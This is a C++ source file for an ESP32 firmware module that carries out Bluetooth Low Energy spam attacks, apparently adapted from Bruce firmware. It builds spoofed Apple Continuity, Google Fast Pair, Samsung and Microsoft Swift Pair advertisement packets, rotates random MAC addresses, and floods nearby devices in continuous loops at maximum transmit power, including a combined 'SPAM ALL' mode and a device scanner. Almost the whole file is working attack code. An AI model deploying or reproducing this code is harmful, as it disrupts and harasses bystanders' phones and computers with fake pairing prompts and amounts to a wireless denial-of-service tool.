#include "ble_attacks_module.h"
#include <esp_bt.h>

// Apple device types (from Bruce firmware)
const uint8_t BLEAttacksModule::appleDevices[] = {
    0x02, // AirPods
    0x0E, // AirPods Pro
    0x0A, // AirPods Max
    0x0F, // AirPods Gen 2
    0x13, // AirPods Gen 3
    0x14, // AirPods Pro Gen 2
    0x03, // PowerBeats
    0x0B, // PowerBeats Pro
    0x0C, // Beats Solo Pro
    0x11, // Beats Studio Buds
    0x10, // Beats Flex
    0x05, // Beats X
    0x06, // Beats Solo 3
    0x09, // Beats Studio 3
    0x17, // Beats Studio Pro
    0x12, // Beats Fit Pro
};
const int BLEAttacksModule::appleDevicesCount = sizeof(appleDevices) / sizeof(appleDevices[0]);

// Android Fast Pair device IDs (from Bruce firmware)
const uint32_t BLEAttacksModule::androidDevices[] = {
    0x0001F0, // Bisto CSR8670 Dev Board
    0x000047, // Arduino 101
    0x00000A, // Anti-Spoof Test
    0x00000B, // Google Gphones
    0x00000D, // Test 00000D
    0x000007, // Android Auto
    0x000009, // Test Android TV
    0x001000, // LG HBS1110
    0xCD8256, // Bose NC 700
    0x0000F0, // Bose QuietComfort 35 II
    0x821F66, // JBL Flip 6
    0xF52494, // JBL Buds Pro
    0x718FA4, // JBL Live 300TWS
    0x92BBBD, // Pixel Buds
    0x000006, // Google Pixel buds
    0xD446A7, // Sony XM5
    0x038B91, // DENON AH-C830NCW
    0x02F637, // JBL LIVE FLEX
    0x02D886, // JBL REFLECT MINI NC
    0xF00305, // LG HBS-1500
    0xF00E97, // JBL VIBE BEAM
    0x04ACFC, // JBL WAVE BEAM
};
const int BLEAttacksModule::androidDevicesCount = sizeof(androidDevices) / sizeof(androidDevices[0]);

// Samsung device models
const uint8_t BLEAttacksModule::samsungModels[] = {
    0x01, // Galaxy Buds
    0x02, // Galaxy Buds+
    0x03, // Galaxy Buds Live
    0x04, // Galaxy Buds Pro
    0x05, // Galaxy Buds2
    0x06, // Galaxy Buds2 Pro
};
const int BLEAttacksModule::samsungModelsCount = sizeof(samsungModels) / sizeof(samsungModels[0]);

// Windows Swift Pair beacon data
const uint8_t BLEAttacksModule::windowsBeacons[] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06};

void BLEAttacksModule::setup() {
    Serial.println("[BLE Attacks] Module initialized");
    
    // Set max BLE TX power
    #if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P21);
    #elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P20);
    #else
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
    #endif
}

void BLEAttacksModule::loop() {
    // Continuous loop handling
}

void BLEAttacksModule::setRandomMAC() {
    uint8_t mac[6];
    for (int i = 0; i < 6; i++) {
        mac[i] = random(0, 256);
    }
    // Ensure it's a random MAC (set bit 1 of first byte)
    mac[0] |= 0x02;
    mac[0] &= 0xFE;
    
    esp_base_mac_addr_set(mac);
}

void BLEAttacksModule::sendAppleBeacon(uint8_t deviceType) {
    NimBLEDevice::init("");
    pAdvertising = NimBLEDevice::getAdvertising();
    
    // Apple Continuity protocol
    uint8_t packet[31];
    int packetSize = 0;
    
    // Manufacturer specific data
    packet[packetSize++] = 0x1E;  // Length
    packet[packetSize++] = 0xFF;  // Type: Manufacturer Specific
    packet[packetSize++] = 0x4C;  // Company ID: Apple Inc. (0x004C)
    packet[packetSize++] = 0x00;
    packet[packetSize++] = 0x0F;  // Type: Proximity Pairing
    packet[packetSize++] = 0x05;  // Length
    packet[packetSize++] = 0x00;  // Status
    packet[packetSize++] = deviceType;  // Device type
    packet[packetSize++] = 0x00;  // Device status
    packet[packetSize++] = 0x00;
    packet[packetSize++] = 0x00;
    
    // Random data
    for (int i = packetSize; i < 31; i++) {
        packet[i] = random(0, 256);
    }
    
    NimBLEAdvertisementData advData;
    advData.addData(packet, 31);
    
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    delay(100);
    pAdvertising->stop();
    
    NimBLEDevice::deinit(true);
}

void BLEAttacksModule::sendAndroidBeacon(uint32_t deviceID) {
    NimBLEDevice::init("");
    pAdvertising = NimBLEDevice::getAdvertising();
    
    // Google Fast Pair protocol
    uint8_t packet[14];
    int packetSize = 0;
    
    packet[packetSize++] = 0x03;  // Length
    packet[packetSize++] = 0x03;  // Complete list of 16-bit UUIDs
    packet[packetSize++] = 0x2C;  // Fast Pair Service UUID
    packet[packetSize++] = 0xFE;
    
    packet[packetSize++] = 0x06;  // Length
    packet[packetSize++] = 0x16;  // Service Data
    packet[packetSize++] = 0x2C;  // Fast Pair Service UUID
    packet[packetSize++] = 0xFE;
    
    // Device ID (3 bytes)
    packet[packetSize++] = (deviceID >> 16) & 0xFF;
    packet[packetSize++] = (deviceID >> 8) & 0xFF;
    packet[packetSize++] = deviceID & 0xFF;
    
    NimBLEAdvertisementData advData;
    advData.addData(packet, packetSize);
    
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    delay(100);
    pAdvertising->stop();
    
    NimBLEDevice::deinit(true);
}

void BLEAttacksModule::sendSamsungBeacon(uint8_t model) {
    NimBLEDevice::init("");
    pAdvertising = NimBLEDevice::getAdvertising();
    
    // Samsung proprietary protocol
    uint8_t packet[20];
    int packetSize = 0;
    
    packet[packetSize++] = 0x10;  // Length
    packet[packetSize++] = 0xFF;  // Type: Manufacturer Specific
    packet[packetSize++] = 0x75;  // Company ID: Samsung (0x0075)
    packet[packetSize++] = 0x00;
    packet[packetSize++] = 0x01;  // Samsung BLE device type
    packet[packetSize++] = 0x00;
    packet[packetSize++] = 0x02;
    packet[packetSize++] = 0x00;
    packet[packetSize++] = 0x01;
    packet[packetSize++] = 0x01;
    packet[packetSize++] = 0xFF;
    packet[packetSize++] = 0x00;
    packet[packetSize++] = 0x00;
    packet[packetSize++] = 0x43;
    packet[packetSize++] = model;  // Model
    packet[packetSize++] = random(0, 256);
    packet[packetSize++] = random(0, 256);
    
    NimBLEAdvertisementData advData;
    advData.addData(packet, packetSize);
    
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    delay(100);
    pAdvertising->stop();
    
    NimBLEDevice::deinit(true);
}

void BLEAttacksModule::sendWindowsBeacon() {
    NimBLEDevice::init("Surface Headphones");
    pAdvertising = NimBLEDevice::getAdvertising();
    
    // Microsoft Swift Pair
    uint8_t packet[10];
    int packetSize = 0;
    
    packet[packetSize++] = 0x06;  // Length
    packet[packetSize++] = 0xFF;  // Type: Manufacturer Specific
    packet[packetSize++] = 0x06;  // Company ID: Microsoft (0x0006)
    packet[packetSize++] = 0x00;
    packet[packetSize++] = 0x03;  // Microsoft Beacon ID
    packet[packetSize++] = 0x00;  // Microsoft Beacon Sub ID
    packet[packetSize++] = 0x80;  // Reserved
    
    NimBLEAdvertisementData advData;
    advData.addData(packet, packetSize);
    
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    delay(100);
    pAdvertising->stop();
    
    NimBLEDevice::deinit(true);
}

void BLEAttacksModule::startAppleJuiceAttack() {
    Serial.println("[BLE Attacks] Starting Apple Juice (iOS spam)");
    spamActive = true;
    
    int deviceIndex = 0;
    while (spamActive) {
        setRandomMAC();
        sendAppleBeacon(appleDevices[deviceIndex]);
        
        deviceIndex++;
        if (deviceIndex >= appleDevicesCount) {
            deviceIndex = 0;
        }
        
        delay(50);
    }
    
    Serial.println("[BLE Attacks] Apple Juice stopped");
}

void BLEAttacksModule::startFastPairAttack() {
    Serial.println("[BLE Attacks] Starting Fast Pair (Android spam)");
    spamActive = true;
    
    int deviceIndex = 0;
    while (spamActive) {
        setRandomMAC();
        sendAndroidBeacon(androidDevices[deviceIndex]);
        
        deviceIndex++;
        if (deviceIndex >= androidDevicesCount) {
            deviceIndex = 0;
        }
        
        delay(50);
    }
    
    Serial.println("[BLE Attacks] Fast Pair stopped");
}

void BLEAttacksModule::startSamsungSpam() {
    Serial.println("[BLE Attacks] Starting Samsung spam");
    spamActive = true;
    
    int modelIndex = 0;
    while (spamActive) {
        setRandomMAC();
        sendSamsungBeacon(samsungModels[modelIndex]);
        
        modelIndex++;
        if (modelIndex >= samsungModelsCount) {
            modelIndex = 0;
        }
        
        delay(50);
    }
    
    Serial.println("[BLE Attacks] Samsung spam stopped");
}

void BLEAttacksModule::startSwiftPairAttack() {
    Serial.println("[BLE Attacks] Starting Swift Pair (Windows spam)");
    spamActive = true;
    
    while (spamActive) {
        setRandomMAC();
        sendWindowsBeacon();
        delay(50);
    }
    
    Serial.println("[BLE Attacks] Swift Pair stopped");
}

void BLEAttacksModule::startBLESpam(BLESpamType type) {
    switch (type) {
        case SPAM_IOS:
            startAppleJuiceAttack();
            break;
        case SPAM_ANDROID:
            startFastPairAttack();
            break;
        case SPAM_SAMSUNG:
            startSamsungSpam();
            break;
        case SPAM_WINDOWS:
            startSwiftPairAttack();
            break;
        case SPAM_ALL:
            Serial.println("[BLE Attacks] Starting SPAM ALL");
            spamActive = true;
            int counter = 0;
            while (spamActive) {
                setRandomMAC();
                
                // Rotate through all types
                switch (counter % 4) {
                    case 0:
                        sendAppleBeacon(appleDevices[random(0, appleDevicesCount)]);
                        break;
                    case 1:
                        sendAndroidBeacon(androidDevices[random(0, androidDevicesCount)]);
                        break;
                    case 2:
                        sendSamsungBeacon(samsungModels[random(0, samsungModelsCount)]);
                        break;
                    case 3:
                        sendWindowsBeacon();
                        break;
                }
                
                counter++;
                delay(50);
            }
            break;
    }
}

void BLEAttacksModule::scanBLEDevices(uint32_t duration) {
    Serial.println("[BLE Attacks] Starting BLE scan");
    
    NimBLEDevice::init("");
    NimBLEScan* pScan = NimBLEDevice::getScan();
    
    pScan->setActiveScan(true);
    pScan->setInterval(100);
    pScan->setWindow(99);
    
    pScan->start(duration, false);
    NimBLEScanResults results = pScan->getResults();
    
    Serial.printf("[BLE Attacks] Scan complete. Found %d devices:\n", results.getCount());
    
    for (int i = 0; i < results.getCount(); i++) {
        const NimBLEAdvertisedDevice* device = results.getDevice(i);
        Serial.printf("  Device %d: %s (RSSI: %d)\n", 
                      i + 1, 
                      device->getAddress().toString().c_str(), 
                      device->getRSSI());
    }
    
    NimBLEDevice::deinit(true);
}

void BLEAttacksModule::stopSpam() {
    Serial.println("[BLE Attacks] Stopping spam");
    spamActive = false;
    NimBLEDevice::deinit(true);
}
